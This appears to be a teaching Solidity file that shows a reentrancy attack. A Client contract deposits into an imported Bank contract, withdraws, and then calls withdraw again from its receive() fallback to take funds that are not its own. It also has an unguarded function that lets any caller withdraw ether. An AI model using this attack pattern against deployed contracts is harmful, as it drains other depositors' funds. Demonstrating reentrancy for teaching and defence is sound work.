//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./Bank.sol";
/*
contract Bank {
    mapping(address => uint256) public balances;
    function deposit() public payable {};
    function withdraw() public {};
}
*/
// CONTRACT TO CONTRACT EXAMPLE
contract Client{

    Bank public bankContract;

    constructor(address payable bankAddress) {
        bankContract = Bank(bankAddress);
    }

    function getETHfromContract(uint256 amount) public {
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    function getContractBalance() public view returns (uint256) {
        return bankContract.balances(address(this));
    }

    function doTheDeposit() public payable {
        bankContract.deposit{value: msg.value}();
    }
    /* ALTERNATIVE WAY
        function doTheDeposit(uint256 amount) public {
        bankContract.deposit{value: amount}();
    }
    */

    // To show RE-ENTRANCY!
    function doTheAttack() public {
        bankContract.withdraw();        // 1st - withdraw your money
    }

    // To show RE-ENTRANCY!
    bool attacked = false;

    receive() external payable {
        // To show RE-ENTRANCY!
        if(!attacked) {
            attacked = true;
            bankContract.withdraw();    // 2nd - withdraw one more time (this time not your money)
        }
    }

}
